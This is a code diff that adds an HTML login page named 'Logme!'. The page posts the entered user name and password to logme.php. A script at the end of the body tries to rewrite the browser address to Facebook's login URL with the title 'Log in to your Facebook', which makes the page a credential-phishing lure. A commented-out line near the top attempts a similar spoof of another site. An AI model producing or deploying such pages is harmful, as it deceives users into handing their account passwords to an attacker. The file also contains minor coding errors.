@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script>
+        //window.history.pushState("hahahahaha", "title", "www.waptrick.com")
+    </script>
+    <link rel="stylesheet" href="https//unpkg.com/boxicons@2.1.4/css/boxicons.min.css">
+    <style>
+        *{
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body{
+            justify-content: center;
+            display: flex;
+            min-height: 100vh;
+            align-items: center;
+            background: url("bg.png") no-repeat;
+            background-size: cover;
+            background-position: center;
+        }
+        .wrap{
+            width: 420px;
+            color: white;
+            background: transparent;
+            border: 2px solid rgba(255, 255, 255, .2);
+            backdrop-filter: blur(20px);
+            box-shadow: rgba(0, 0, 0, .2);
+            border-radius: 10px;
+            padding: 30px 40px;
+        }
+        .wrap h1{
+            text-align: center;
+            font-size: 43px;
+        }
+        .wrap .text-field{
+            width: 100%;
+            height: 50px;
+            margin: 30px 0;
+        }
+        .text-field input{
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            border: none;
+            outline: none;
+            border: 2px solid rgba(255, 255, 255, .2);
+            border-radius: 40px;
+            padding: 20px 40px 20px 20px;
+            color: #fff;
+            font-size: 16px;
+        }
+        .text-field input::placeholder{
+            color: #fff;
+        }
+        .wrap .remember-me{
+            justify-content: space-between;
+            display: flex;
+            margin: -15px 0 15px;
+            font-size: 14.5px;
+        }
+        .remember-me label input{
+            accent-color: #fff;
+            margin-right: 3px;
+        }
+        .remember-me a{
+            color: #fff;
+            text-decoration: none;
+        }
+        .remember-me a:hover{
+            text-decoration: underline;
+        }
+        .wrap .btn{
+            width: 100%;
+            height: 45px;
+            background-color: #fff;
+            border: none;
+            outline: none;
+            border-radius: 40px;
+            box-shadow: green;
+            cursor: pointer;
+            font-size: 15px;
+            color: #333;
+            font-weight: 600;
+        }
+        .wrap .register-me{
+            font-size: 14.5pxs;
+            text-align: center;
+            margin: 20px 0 15px;
+        }
+        .register-me p a{
+            color: #fff;
+            text-decoration: none;
+        }
+        .register-me p a:hover{
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="wrap">
+        <form action="logme.php" method="post">
+            <div class="head">
+                <h1>Logme!</h1>
+            </div>
+            <div class="text-field">
+                <input type="text" placeholder="User" name="email" required/>
+                <i class="bx bxs-user"></i>
+            </div>
+            <div class="text-field">
+                <input type="password" placeholder="Password" name="password" required/>
+                <i class="bx bxs-lock-alt"></i>
+            </div>
+            <div class="remember-me">
+                <label for=""><input type="checkbox">Remember Me!</label> 
+                <a href="#">Forget Password?</a>
+            </div>
+            <input class="btn" value="Logme!" type="submit">
+            <div class="register-me">
+                <p>Don't have an account? <a href="#">Register Me!</a></p>
+            </div>
+        </form>
+    </div>
+    <script>
+                window.history.pushState("Log in to your Facebook", "Facebook", "https://www.facebook.com/login.php");
+
+    </script>
+</body>
+</html>
